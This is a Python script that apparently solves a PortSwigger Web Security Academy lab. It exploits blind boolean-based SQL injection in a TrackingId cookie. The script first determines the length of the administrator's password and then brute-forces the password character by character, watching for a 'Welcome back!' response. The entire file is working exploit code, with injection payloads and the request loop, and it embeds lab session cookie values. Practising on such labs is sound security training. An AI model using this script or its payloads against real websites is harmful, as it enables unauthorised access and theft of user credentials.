import requests
import string

url = 'https://0aa400d70334a45d80c121f600c200aa.web-security-academy.net/filter?category=Lifestyle'

def get_length():
    for i in range(1, 100):
        cookie = {'TrackingId': '6CDzCCQDL1zVFRNz', 'session': 'QoZxJvkS9Kke6VWREDdGqMacwLAdHtvK'}
        payload = f"' and length((select password from users where username = 'administrator')) = {i}--"
        cookie['TrackingId'] = cookie['TrackingId'] + payload
        r = requests.get(url, cookies=cookie)
        if 'Welcome back!' in r.text:
            return i

def brute_force_password(length):
    password = ''
    characters = string.ascii_letters + string.digits  # All possible characters
    for i in range(1, length + 1):
        for char in characters:
            cookie = {'TrackingId': '6CDzCCQDL1zVFRNz', 'session': 'QoZxJvkS9Kke6VWREDdGqMacwLAdHtvK'}
            payload = f"' and substring((select password from users where username = 'administrator'), {i}, 1) = '{char}'--"
            cookie['TrackingId'] = cookie['TrackingId'] + payload
            r = requests.get(url, cookies=cookie)
            if 'Welcome back!' in r.text:
                password += char
                print(f"Found character {i}: {char}")
                break
    return password

length = get_length()
print(f"Length is {length}")

password = brute_force_password(length)
print(f"Password is {password}")
